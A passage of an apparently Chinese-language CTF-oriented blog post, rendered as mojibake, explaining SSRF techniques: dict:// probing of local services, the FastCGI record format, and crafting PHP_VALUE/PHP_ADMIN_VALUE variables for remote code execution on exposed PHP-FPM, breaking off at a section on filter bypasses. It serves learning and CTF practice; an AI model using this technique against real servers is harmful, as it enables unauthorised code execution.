class="language-sh">dict:&#x2F;&#x2F;127.0.0.1:ç«¯å£&#x2F;</code></pre><p>ç”¨ncåœ¨æµ‹è¯•æœºç›‘å¬ï¼Œç„¶ååˆ©ç”¨ssrfæ¼æ´æµ‹è¯•ä¸€ä¸‹dictåè®®å‘é€å­—ç¬¦ä¸²infoï¼Œçœ‹çœ‹æ¥æ”¶æ–¹ä¼šæ”¶åˆ°ä»€ä¹ˆï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427190812101.png" alt="image-20220427190812101"></p><p>å¯ä»¥çœ‹åˆ°ä¸€å…±æ”¶åˆ°äº†ä¸‰è¡Œæ•°æ®ï¼Œç¬¬ä¸€è¡Œæ˜¯ç‰ˆæœ¬å·ï¼Œç¬¬äºŒè¡Œæ˜¯æˆ‘ä»¬å‘é€çš„æ•°æ®ï¼Œç¬¬ä¸‰è¡Œæ˜¯è‡ªåŠ¨æ·»åŠ çš„QUITã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427190738841.png" alt="image-20220427190738841"></p><p>æˆåŠŸçœ‹åˆ°äº†mysqlæ•°æ®åº“çš„ç‰ˆæœ¬å·</p><p>å¯ä»¥åˆ©ç”¨dictè¿›è¡ŒæŒ‡çº¹è¯†åˆ«</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429183350712.png" alt="image-20220429183350712"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429183432301.png" alt="image-20220429183432301"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429183500425.png" alt="image-20220429183500425"></p><h1 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h1><p>è¿™éƒ¨åˆ†ä¸æ˜¯å¾ˆç†Ÿï¼Œç›´æ¥ä¸Šå‚è€ƒæ–‡ç« äº†</p><p><a href="https://www.modb.pro/db/163739">https://www.modb.pro/db/163739</a></p><h3 id="ä»€ä¹ˆæ˜¯FastCGI"><a href="#ä»€ä¹ˆæ˜¯FastCGI" class="headerlink" title="ä»€ä¹ˆæ˜¯FastCGI"></a>ä»€ä¹ˆæ˜¯FastCGI</h3><p>åœ¨ç½‘ç«™æ¶æ„ä¸­ï¼ŒWeb Serverï¼ˆå¦‚Nginxï¼‰åªæ˜¯å†…å®¹çš„åˆ†å‘è€…</p><p>å½“å®¢æˆ·ç«¯è¯·æ±‚çš„æ˜¯index.phpï¼Œæ ¹æ®é…ç½®æ–‡ä»¶Web Serverè¾¨åˆ«ä¸æ˜¯é™æ€æ–‡ä»¶ï¼Œæ­¤æ—¶å°±éœ€è¦å»æ‰¾ PHPè§£æå™¨æ¥å¤„ç†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/modb_20211112_3920a5e6-43ac-11ec-a089-fa163eb4f6be.png" alt="img"></p><p>å½“Web Serveræ”¶åˆ° index.php è¿™ä¸ªè¯·æ±‚åï¼Œä¼šå¯åŠ¨å¯¹åº”çš„<strong>CGI ç¨‹åº</strong>ï¼Œä¹Ÿå°±æ˜¯PHPè§£æå™¨</p><p>æ¥ä¸‹æ¥PHPè§£æå™¨ä¼šè§£æphp.iniæ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥<strong>CGIè§„èŒƒçš„æ ¼å¼</strong>è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ï¼ŒWeb serverå†æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚è¿™å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„åŠ¨æ€PHP Webè®¿é—®æµç¨‹</p><ul><li><strong>CGIï¼š</strong> æ˜¯ Web Server ä¸ Web Application ä¹‹é—´ <strong>æ•°æ®äº¤æ¢çš„ä¸€ç§åè®®</strong></li><li><strong>FastCGIï¼š</strong> åŒ CGIï¼Œæ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œå¯¹æ¯” CGI æå‡äº†5å€ä»¥ä¸Šæ€§èƒ½</li><li><strong>PHP-CGIï¼š</strong> æ˜¯ PHPï¼ˆWeb Applicationï¼‰å¯¹ Web Server æä¾›çš„ CGI åè®®çš„æ¥å£ç¨‹åº</li><li><strong>PHP-FPMï¼š</strong> æ˜¯ PHPï¼ˆWeb Applicationï¼‰å¯¹ Web Server æä¾›çš„ FastCGI åè®®çš„æ¥å£ç¨‹åºï¼Œé¢å¤–è¿˜æä¾›äº†ç›¸å¯¹æ™ºèƒ½çš„ä»»åŠ¡ç®¡ç†åŠŸèƒ½</li></ul><p>PHPé»˜è®¤æä¾›äº†å¾ˆå¤šç§SAPIï¼ˆæœåŠ¡å™¨ç«¯åº”ç”¨ç¼–ç¨‹ç«¯å£ï¼‰ï¼Œå¸¸è§çš„æä¾›ç»™apacheå’Œnginxçš„<code>php5_module</code>ã€<code>CGI</code>ã€<code>FastCGI</code>ï¼Œç»™IISçš„<code>ISAPI</code>ï¼Œä»¥åŠShellçš„<code>CLI</code></p><p>ç»è¿‡ä¸æ–­çš„æŠ€æœ¯å‡çº§ï¼Œç›®å‰æ­å»ºé«˜æ€§èƒ½çš„PHP WebæœåŠ¡å™¨ï¼Œæœ€ä½³çš„æ–¹å¼æ˜¯<strong>Apache/Nginx</strong> + <strong>FastCGI</strong> + **PHP-FPM(PHP-CGI)**æ–¹å¼</p><h4 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="å·¥ä½œåŸç†"></a>å·¥ä½œåŸç†</h4><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/modb_20211112_396ea818-43ac-11ec-a089-fa163eb4f6be.png" alt="img"></p><p>Web æœåŠ¡å™¨å¯åŠ¨æ—¶è½½å…¥<strong>FastCGIè¿›ç¨‹ç®¡ç†å™¨</strong>ï¼ˆPHP-CGIæˆ–è€…PHP-FPM)</p><ol><li>FastCGI è¿›ç¨‹ç®¡ç†å™¨è‡ªèº«åˆå§‹åŒ–ï¼Œå¯åŠ¨å¤šä¸ª CGI è§£é‡Šå™¨è¿›ç¨‹ï¼Œå¹¶ç­‰å¾…æ¥è‡ª Web Server çš„è¿æ¥</li><li>Web æœåŠ¡å™¨ä¸ FastCGI è¿›ç¨‹ç®¡ç†å™¨è¿›è¡Œ <strong>Socket é€šä¿¡</strong>ï¼Œé€‰æ‹©ä¸€ä¸ªCGI è§£é‡Šå™¨è¿›ç¨‹ï¼Œ<strong>é€šè¿‡ FastCGI åè®®å‘é€ CGI ç¯å¢ƒå˜é‡å’Œæ ‡å‡†è¾“å…¥æ•°æ®ç»™ è¿™ä¸ªCGI è§£é‡Šå™¨è¿›ç¨‹</strong></li><li>CGI è§£é‡Šå™¨è¿›ç¨‹å®Œæˆå¤„ç†åå°†<strong>æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯ä¿¡æ¯ä»åŒä¸€è¿æ¥è¿”å› Web æœåŠ¡å™¨</strong></li><li>CGI è§£é‡Šå™¨è¿›ç¨‹æ¥ç€ç­‰å¾…å¹¶å¤„ç†æ¥è‡ª Web æœåŠ¡å™¨çš„ä¸‹ä¸€ä¸ªè¿æ¥</li></ol><p>ç”±æ­¤ï¼Œ<strong>PHP-FPM å°±æ˜¯ä¸€ä¸ªFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼Œæ˜¯å¯¹äº FastCGI åè®®çš„å…·ä½“å®ç°</strong>ï¼Œå®ƒè´Ÿè´£ç®¡ç†ä¸€ä¸ªè¿›ç¨‹æ± ï¼Œæ¥å¤„ç†æ¥è‡ªWebæœåŠ¡å™¨çš„è¯·æ±‚ã€‚</p><h4 id="PHP-FPMé€šä¿¡æ–¹å¼"><a href="#PHP-FPMé€šä¿¡æ–¹å¼" class="headerlink" title="PHP-FPMé€šä¿¡æ–¹å¼"></a>PHP-FPMé€šä¿¡æ–¹å¼</h4><p>åœ¨PHPä½¿ç”¨FastCGIè¿æ¥æ¨¡å¼çš„æƒ…å†µä¸‹ï¼ŒWebæœåŠ¡å™¨ä¸­é—´ä»¶å¦‚Nginxå’ŒPHP-FPMä¹‹é—´çš„é€šä¿¡æ–¹å¼åˆåˆ†ä¸ºä¸¤ç§ï¼Œ<strong>TCPæ¨¡å¼å’Œå¥—æ¥å­—(unix socket)æ¨¡å¼</strong></p><ul><li><strong>TCPæ¨¡å¼</strong>å³æ˜¯PHP-FPMè¿›ç¨‹ä¼šç›‘å¬æœ¬æœºä¸Šçš„ä¸€ä¸ªç«¯å£ï¼ˆé»˜è®¤ä¸º9000ï¼‰ï¼Œç„¶åNginxä¼šæŠŠå®¢æˆ·ç«¯è¯·æ±‚æ•°æ®é€šè¿‡FastCGIåè®®ä¼ ç»™9000ç«¯å£ï¼ŒPHP-FPMæ‹¿åˆ°æ•°æ®åä¼šè°ƒç”¨CGIè¿›ç¨‹è§£æ</li><li><strong>Unixå¥—æ¥å­—æ¨¡å¼</strong>æ˜¯Unixç³»ç»Ÿè¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰çš„ä¸€ç§è¢«å¹¿æ³›é‡‡ç”¨æ–¹å¼ï¼Œä»¥æ–‡ä»¶ï¼ˆä¸€èˆ¬æ˜¯.sockï¼‰ä½œä¸ºsocketçš„å”¯ä¸€æ ‡è¯†ï¼ˆæè¿°ç¬¦ï¼‰ï¼Œéœ€è¦é€šä¿¡çš„ä¸¤ä¸ªè¿›ç¨‹å¼•ç”¨åŒä¸€ä¸ªsocketæè¿°ç¬¦æ–‡ä»¶å°±å¯ä»¥å»ºç«‹é€šé“è¿›è¡Œé€šä¿¡äº†ã€‚ä¸Šè¿°åŸç†å›¾ä¸­æåˆ°çš„<strong>Socket é€šä¿¡</strong>å³ä¸ºæ­¤æ¨¡å¼</li></ul><p>ssrfä¸­å¯¹FastCGIçš„æ”»å‡»æ˜¯åˆ©ç”¨äº†TCPæ¨¡å¼</p><h3 id="FastCGIæ”»å‡»"><a href="#FastCGIæ”»å‡»" class="headerlink" title="FastCGIæ”»å‡»"></a>FastCGIæ”»å‡»</h3><h4 id="FastCGIåè®®"><a href="#FastCGIåè®®" class="headerlink" title="FastCGIåè®®"></a>FastCGIåè®®</h4><p>HTTPåè®®æ˜¯æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¸­é—´ä»¶è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ï¼Œç±»æ¯”HTTPåè®®æ¥è¯´ï¼Œfastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯ï¼ˆå¦‚PHP-FPMï¼‰è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®</p><p>Fastcgiåè®®ç”±å¤šä¸ªrecordç»„æˆï¼Œrecordä¹Ÿæœ‰headerå’Œbodyä¸€è¯´ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†è¿™äºŒè€…æŒ‰ç…§fastcgiçš„è§„åˆ™å°è£…å¥½å‘é€ç»™è¯­è¨€åç«¯ï¼ˆPHP-FPMï¼‰ï¼Œè¯­è¨€åç«¯ï¼ˆPHP-FPMï¼‰è§£ç ä»¥åæ‹¿åˆ°å…·ä½“æ•°æ®ï¼Œè¿›è¡ŒæŒ‡å®šæ“ä½œï¼Œå¹¶å°†ç»“æœå†æŒ‰ç…§è¯¥åè®®å°è£…å¥½åè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶</p><p>recordçš„å¤´å›ºå®š8ä¸ªå­—èŠ‚ï¼Œbodyæ˜¯ç”±å¤´ä¸­çš„contentLengthæŒ‡å®šï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š</p><pre class="language-none"><code class="language-none">typedef struct &#123;  &#x2F;* Header *&#x2F;  unsigned char version; &#x2F;&#x2F; ç‰ˆæœ¬  unsigned char type; &#x2F;&#x2F; æœ¬æ¬¡recordçš„ç±»å‹  unsigned char requestIdB1; &#x2F;&#x2F; æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id  unsigned char requestIdB0;  unsigned char contentLengthB1; &#x2F;&#x2F; bodyä½“çš„å¤§å°  unsigned char contentLengthB0;  unsigned char paddingLength; &#x2F;&#x2F; é¢å¤–å—å¤§å°  unsigned char reserved;   &#x2F;* Body *&#x2F;  unsigned char contentData[contentLength];  unsigned char paddingData[paddingLength];&#125; FCGI_Record;</code></pre><blockquote><p>è¯­è¨€ç«¯ï¼ˆPHP-FPMï¼‰è§£æäº†fastcgiå¤´ä»¥åï¼Œæ‹¿åˆ°<code>contentLength</code><br>ï¼Œç„¶åå†åœ¨TCPæµé‡Œè¯»å–å¤§å°ç­‰äº<code>contentLength</code><br>çš„æ•°æ®ï¼Œè¿™å°±æ˜¯bodyä½“</p><p>Bodyåé¢è¿˜æœ‰ä¸€æ®µé¢å¤–çš„æ•°æ®ï¼ˆPaddingï¼‰ï¼Œå…¶é•¿åº¦ç”±å¤´ä¸­çš„paddingLengthæŒ‡å®šï¼Œèµ·ä¿ç•™ä½œç”¨  ä¸éœ€è¦è¯¥Paddingçš„æ—¶å€™ï¼Œå°†å…¶é•¿åº¦è®¾ç½®ä¸º0å³å¯</p><p>å¯è§ï¼Œä¸€ä¸ªfastcgi recordç»“æ„æœ€å¤§æ”¯æŒçš„bodyå¤§å°æ˜¯<code>2^16</code></p><p>ï¼Œä¹Ÿå°±æ˜¯65536å­—èŠ‚</p></blockquote><p>å…¶ä¸­ï¼Œheaderä¸­çš„<code>type</code><br>ä»£è¡¨æœ¬æ¬¡recordçš„ç±»å‹ï¼Œæ‰€æœ‰å€¼åŠå…·ä½“å«ä¹‰å¦‚ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429194926645.png" alt="image-20220429194926645"></p><p>æœåŠ¡å™¨ä¸­é—´ä»¶å’Œåç«¯è¯­è¨€é€šä¿¡ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…å°±æ˜¯<code>type</code>ä¸º1çš„recordï¼Œåç»­äº’ç›¸äº¤æµï¼Œå‘é€<code>type</code>ä¸º4ã€5ã€6ã€7çš„recordï¼Œç»“æŸæ—¶å‘é€<code>type</code>ä¸º2ã€3çš„recordã€‚</p><p>è¿™é‡Œç€é‡è®²ä¸€ä¸‹typeä¸º4ï¼Œå½“åç«¯è¯­è¨€æ¥æ”¶åˆ°ä¸€ä¸ª <code>type</code> ä¸º4çš„ Record åï¼Œå°±ä¼šæŠŠè¿™ä¸ª Record çš„ Body æŒ‰ç…§å¯¹åº”çš„ç»“æ„è§£ææˆ key-value å¯¹ï¼Œç»“æ„å¦‚ä¸‹ï¼š</p><pre class="language-none"><code class="language-none">typedef struct &#123;  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;  unsigned char nameData[nameLength];  unsigned char valueData[valueLength];&#125; FCGI_NameValuePair11;typedef struct &#123;  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;  unsigned char valueLengthB2;  unsigned char valueLengthB1;  unsigned char valueLengthB0;  unsigned char nameData[nameLength];  unsigned char valueData[valueLength          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&#125; FCGI_NameValuePair14;typedef struct &#123;  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;  unsigned char nameLengthB2;  unsigned char nameLengthB1;  unsigned char nameLengthB0;  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;  unsigned char nameData[nameLength          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];  unsigned char valueData[valueLength];&#125; FCGI_NameValuePair41;typedef struct &#123;  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;  unsigned char nameLengthB2;  unsigned char nameLengthB1;  unsigned char nameLengthB0;  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;  unsigned char valueLengthB2;  unsigned char valueLengthB1;  unsigned char valueLengthB0;  unsigned char nameData[nameLength          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];  unsigned char valueData[valueLength          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&#125; FCGI_NameValuePair44;</code></pre><p>è¿™å…¶å®æ˜¯ 4 ä¸ªç»“æ„ï¼Œè‡³äºç”¨å“ªä¸ªç»“æ„ï¼Œæœ‰å¦‚ä¸‹è§„åˆ™ï¼š</p><ol><li>keyã€valueå‡å°äº128å­—èŠ‚ï¼Œç”¨ <code>FCGI_NameValuePair11</code></li><li>keyå¤§äº128å­—èŠ‚ï¼Œvalueå°äº128å­—èŠ‚ï¼Œç”¨ <code>FCGI_NameValuePair41</code></li><li>keyå°äº128å­—èŠ‚ï¼Œvalueå¤§äº128å­—èŠ‚ï¼Œç”¨ <code>FCGI_NameValuePair14</code></li><li>keyã€valueå‡å¤§äº128å­—èŠ‚ï¼Œç”¨ <code>FCGI_NameValuePair44</code></li></ol><p>ä¸¾ä¸ªä¾‹å­ï¼Œç”¨æˆ·è®¿é—®<code>http://127.0.0.1/index.php?a=1&amp;b=2</code><br>å¦‚æœwebç›®å½•æ˜¯<code>/var/www/html</code><br>é‚£ä¹ˆæœåŠ¡å™¨ä¸­é—´ä»¶ï¼ˆNginxï¼‰ä¼šå°†è¿™ä¸ªè¯·æ±‚å˜æˆå¦‚ä¸‹key-valueå¯¹ï¼š</p><pre class="language-none"><code class="language-none">&#123;    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,    &#39;SERVER_PORT&#39;: &#39;80&#39;,    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;&#125;</code></pre><p>è¿™ä¸ªæ•°ç»„å…¶å®å°±æ˜¯PHPä¸­<code>$_SERVER</code><br>æ•°ç»„çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯PHPé‡Œçš„ç¯å¢ƒå˜é‡ã€‚ä½†ç¯å¢ƒå˜é‡çš„ä½œç”¨ä¸ä»…æ˜¯å¡«å……<code>$_SERVER</code><br>æ•°ç»„ï¼Œä¹Ÿæ˜¯å‘Šè¯‰FPMï¼šâ€œæˆ‘è¦æ‰§è¡Œå“ªä¸ªPHPæ–‡ä»¶â€</p><p>å½“åç«¯è¯­è¨€ï¼ˆPHP-FPMï¼‰æ‹¿åˆ°ç”±Nginxå‘è¿‡æ¥çš„FastCGIæ•°æ®åŒ…åï¼Œè¿›è¡Œè§£æï¼Œå¾—åˆ°ä¸Šè¿°è¿™äº›ç¯å¢ƒå˜é‡ã€‚ç„¶åï¼Œ<strong>æ‰§è¡Œ<code>SCRIPT_FILENAME</code><br>çš„å€¼æŒ‡å‘çš„PHPæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯<code>/var/www/html/index.php</code></strong></p><h4 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h4><p><strong>PHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ FastCGIåè®®ï¼Œå’ŒFPMè¿›è¡Œé€šä¿¡</strong>ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¦‚æœèƒ½å¤Ÿè‡ªè¡Œæ„é€ SCRIPT_FILENAMEçš„å€¼ï¼Œå°±èƒ½æ§åˆ¶PHP-FPMæ‰§è¡Œä»»æ„åç¼€æ–‡ä»¶ï¼Œå¦‚<code>/etc/passwd</code></p><p>ä½†æ˜¯ï¼Œåœ¨PHP5.3.9ä¹‹åï¼ŒFPMé»˜è®¤é…ç½®ä¸­å¢åŠ äº†<code>security.limit_extensions</code>é€‰é¡¹</p><pre class="language-none"><code class="language-none">; Limits the extensions of the main script FPM will allow to parse. This can; prevent configuration mistakes on the web server side. You should only limit; FPM to .php extensions to prevent malicious users to use other extensions to; exectute php code.; Note: set an empty value to allow all extensions.; Default Value: .php;security.limit_extensions &#x3D; .php .php3 .php4 .php5 .php7</code></pre><p>é™åˆ¶äº†åªæœ‰.phpåç¼€çš„æ–‡ä»¶æ‰èƒ½å¤Ÿè¢«FPMæ‰§è¡Œ</p><p>å› æ­¤ï¼Œæƒ³åˆ©ç”¨PHP-FPMçš„æœªæˆæƒè®¿é—®æ¼æ´ï¼Œé¦–å…ˆå°±å¾—æ‰¾åˆ°ä¸€ä¸ªå·²å­˜åœ¨çš„PHPæ–‡ä»¶ã€‚å·²å­˜åœ¨çš„PHPæ–‡ä»¶åè·å¾—æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>é€šè¿‡ç³»ç»Ÿçš„ä¿¡æ¯æ”¶é›†ã€çˆ†ç ´ã€æŠ¥é”™è·å¾—æŸä¸ªPHPæ–‡ä»¶ååŠå…¶è·¯å¾„</li><li>æ‰¾å®‰è£…PHPåé»˜è®¤å­˜åœ¨çš„PHPæ–‡ä»¶ï¼Œå¦‚<code>/usr/local/lib/php/PEAR.php</code></li></ul><p>ç°åœ¨ï¼Œæ‹¿åˆ°äº†æ–‡ä»¶åï¼Œæˆ‘ä»¬<strong>èƒ½æ§åˆ¶<code>SCRIPT_FILENAME</code><br>ï¼Œå´åªèƒ½æ‰§è¡Œç›®æ ‡æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå¹¶ä¸èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»»æ„ä»£ç ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ <code>type</code><br>å€¼ä¸º4çš„recordï¼Œä¹Ÿå°±æ˜¯è®¾ç½®å‘PHP-FPMä¼ é€’çš„ç¯å¢ƒå˜é‡æ¥è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„</strong></p><blockquote><p>åœ¨PHP.INIä¸­æœ‰ä¸¤ä¸ªé…ç½®é¡¹ï¼Œ<code>auto_prepend_file</code>å’Œ<code>auto_append_file</code>ã€‚</p><p><code>auto_prepend_file</code>æ˜¯å‘Šè¯‰PHPï¼Œåœ¨æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¹‹å‰ï¼Œå…ˆåŒ…å«<code>auto_prepend_file</code>ä¸­æŒ‡å®šçš„æ–‡ä»¶ï¼›</p><p><code>auto_append_file</code>æ˜¯å‘Šè¯‰PHPï¼Œåœ¨æ‰§è¡Œå®Œæˆç›®æ ‡æ–‡ä»¶åï¼ŒåŒ…å«<code>auto_append_file</code>æŒ‡å‘çš„æ–‡ä»¶ã€‚</p></blockquote><p>è‹¥æˆ‘ä»¬è®¾ç½®<code>auto_prepend_file</code>ä¸º<code>php://input</code>ï¼ˆ<code>allow_url_include=on</code>ï¼‰ï¼Œé‚£ä¹ˆå°±ç­‰äºåœ¨æ‰§è¡Œä»»ä½•PHPæ–‡ä»¶å‰éƒ½è¦åŒ…å«ä¸€éPOSTçš„å†…å®¹ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠå¾…æ‰§è¡Œçš„ä»£ç æ”¾åœ¨FastCGIåè®® Bodyä¸­ï¼Œå®ƒä»¬å°±èƒ½è¢«æ‰§è¡Œäº†</p><p>è€Œè¿™å°±è¦åˆ©ç”¨åç«¯è¯­è¨€ï¼ˆPHP-FPMï¼‰æ‹¿åˆ°ç”±Nginxå‘è¿‡æ¥çš„FastCGIæ•°æ®åŒ…åï¼Œè¿›è¡Œè§£æï¼Œå¾—åˆ°çš„ç¯å¢ƒå˜é‡äº†ã€‚</p><p>åœ¨å…¶ä¸­æœ‰PHP_VALUEå’ŒPHP_ADMIN_VALUEä¸¤ä¸ªç‰¹æ®Šçš„å€¼</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/modb_20211112_39f986d6-43ac-11ec-a089-fa163eb4f6be.png" alt="img"></p><p>æ‰€ä»¥æˆ‘ä»¬åªè¦å°†ç¯å¢ƒå˜é‡æ„é€ æˆ</p><pre class="language-none"><code class="language-none">&#123;    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,    &#39;SERVER_PORT&#39;: &#39;80&#39;,    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;&#125;</code></pre><p>å°±èƒ½å®ç°rceçš„ç›®çš„</p><p>ctfä¸­ä¸€èˆ¬çš„åˆ©ç”¨æ¡ä»¶</p><ul><li>PHPç‰ˆæœ¬è¦é«˜äº5.3.3ï¼Œæ‰èƒ½åŠ¨æ€ä¿®æ”¹PHP.INIé…ç½®æ–‡ä»¶</li><li>çŸ¥é“é¢˜ç›®ç¯å¢ƒä¸­çš„ä¸€ä¸ªPHPæ–‡ä»¶çš„ç»å¯¹è·¯å¾„</li><li>PHP-FPMç›‘å¬åœ¨æœ¬æœº9000ç«¯å£</li></ul><p>ä¾‹é¢˜å‚è€ƒ</p><p><a href="https://ethe448.github.io/2022/05/12/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9%E5%A4%8D%E7%8E%B0/#toc-heading-5">é™‡åŸæˆ˜å½¹å¤ç° | Ethe&#39;s blog (ethe448.github.io)</a></p><h1 id="ä¸€äº›ç»•è¿‡"><a href="#ä¸€äº›ç»•è¿‡" class="headerlink" title="ä¸€äº›ç»•è¿‡"></a>ä¸€äº›ç»•è¿‡</h1><p>å¯¹äºSSRFçš„é™åˆ¶å¤§è‡´æœ‰å¦‚ä¸‹å‡ ç§ï¼š</p><ul><li>é™åˆ¶è¯·æ±‚çš„ç«¯å£åªèƒ½ä¸ºWebç«¯å£ï¼Œåªå…è®¸è®¿é—®HTTPå’ŒHTTPSçš„è¯·æ±‚ã€‚</li><li>é™åˆ¶åŸŸååªèƒ½ä¸º<a href="http://www.xxx.com/">http://www.xxx.com</a></li><li>é™åˆ¶ä¸èƒ½è®¿é—®å†…ç½‘çš„IPï¼Œä»¥é˜²æ­¢å¯¹å†…ç½‘è¿›è¡Œæ”»å‡»ã€‚</li><li>å±è”½è¿”å›çš„è¯¦ç»†ä¿¡æ¯ã€‚</li></ul><h3 id="åˆ©ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡"><a href="#åˆ©ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡" class="headerlink" 